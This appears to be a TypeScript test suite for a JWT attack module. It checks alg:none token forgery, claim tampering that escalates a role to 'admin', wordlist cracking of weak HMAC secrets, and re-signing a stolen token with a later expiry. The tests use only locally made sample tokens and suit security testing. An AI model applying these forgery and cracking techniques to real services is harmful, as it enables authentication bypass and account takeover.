import { strict as assert } from "node:assert";
import { createHmac } from "node:crypto";
import { test } from "node:test";
import {
  ALG_NONE_VARIANTS,
  JWT_WEAK_SECRETS,
  bumpJwtExp,
  crackJwtHmac,
  forgeAlgNone,
  forgeJwtHmac,
  jwtForgeCandidates,
  parseJwt,
} from "./jwt.js";

const b64url = (o: unknown): string =>
  Buffer.from(JSON.stringify(o), "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

function signHs(alg: "HS256" | "HS384" | "HS512", payload: unknown, secret: string): string {
  const digest = alg === "HS256" ? "sha256" : alg === "HS384" ? "sha384" : "sha512";
  const h = b64url({ alg, typ: "JWT" });
  const p = b64url(payload);
  const sig = createHmac(digest, secret).update(`${h}.${p}`).digest("base64url");
  return `${h}.${p}.${sig}`;
}

const sampleUnsigned = `${b64url({ alg: "HS256", typ: "JWT" })}.${b64url({ sub: "user1", role: "user", email: "u1@x" })}.SIGNATURE`;

test("forgeAlgNone flips header to alg:none, keeps payload, empties the signature", () => {
  const forged = forgeAlgNone(sampleUnsigned);
  assert.ok(forged);
  const parsed = parseJwt(forged!);
  assert.equal(parsed?.header.alg, "none");
  assert.equal(forged!.split(".")[2], "");
  assert.deepEqual(parsed?.payload, { sub: "user1", role: "user", email: "u1@x" });
});

test("forgeAlgNone accepts None / NONE variants", () => {
  for (const alg of ALG_NONE_VARIANTS) {
    const forged = forgeAlgNone(sampleUnsigned, undefined, alg);
    assert.equal(parseJwt(forged!)?.header.alg, alg, alg);
  }
});

test("forgeAlgNone can mutate a claim (privilege escalation variant)", () => {
  const forged = forgeAlgNone(sampleUnsigned, (c) => {
    c.role = "admin";
  });
  assert.equal(parseJwt(forged!)?.payload.role, "admin");
  assert.equal(parseJwt(forged!)?.payload.sub, "user1");
});

test("forgeAlgNone returns null for non-JWT input", () => {
  assert.equal(forgeAlgNone("not-a-jwt"), null);
  assert.equal(forgeAlgNone("only.two"), null);
  assert.equal(forgeAlgNone(""), null);
});

test("crackJwtHmac finds a wordlist secret and rejects a miss", () => {
  const token = signHs("HS256", { sub: "u1", exp: 9_999_999_999 }, "secret");
  const hit = crackJwtHmac(token);
  assert.deepEqual(hit, { secret: "secret", alg: "HS256" });
  assert.equal(crackJwtHmac(token, ["nope", "also-nope"]), null);
});

test("crackJwtHmac handles an empty secret and HS384", () => {
  assert.ok(JWT_WEAK_SECRETS.includes(""));
  const empty = signHs("HS256", { sub: "u1" }, "");
  assert.equal(crackJwtHmac(empty)?.secret, "");
  const hs384 = signHs("HS384", { sub: "u1" }, "jwt-secret");
  assert.deepEqual(crackJwtHmac(hs384), { secret: "jwt-secret", alg: "HS384" });
});

test("crackJwtHmac skips RS256 (no HMAC to crack)", () => {
  const rs = `${b64url({ alg: "RS256", typ: "JWT" })}.${b64url({ sub: "u1" })}.${b64url("not-a-real-sig")}`;
  assert.equal(crackJwtHmac(rs), null);
});

test("forgeJwtHmac + bumpJwtExp is not a replay of the stolen token", () => {
  const token = signHs("HS256", { sub: "u1", role: "user", exp: 1_700_000_000 }, "secret");
  const forged = forgeJwtHmac(token, "secret", bumpJwtExp);
  assert.ok(forged);
  assert.notEqual(forged, token);
  const parsed = parseJwt(forged!);
  assert.equal(parsed?.payload.sub, "u1");
  assert.equal(parsed?.payload.exp, 1_700_000_060);
  const again = crackJwtHmac(forged!);
  assert.equal(again?.secret, "secret");
});

test("jwtForgeCandidates: weak HMAC first, then none variants; RS256 is none-only", () => {
  const hs = signHs("HS256", { sub: "u1", exp: 1_700_000_000 }, "secret");
  const hsCands = jwtForgeCandidates(hs, bumpJwtExp);
  assert.equal(hsCands[0]?.technique, "weak-hmac:HS256");
  assert.equal(hsCands[0]?.secret, "secret");
  assert.deepEqual(
    hsCands.slice(1).map((c) => c.technique),
    ["alg:none", "alg:None", "alg:NONE"],
  );

  const rs = `${b64url({ alg: "RS256", typ: "JWT" })}.${b64url({ sub: "u1" })}.sig`;
  const rsCands = jwtForgeCandidates(rs, bumpJwtExp);
  assert.equal(rsCands.length, 3);
  assert.ok(rsCands.every((c) => c.technique.startsWith("alg:")));
});
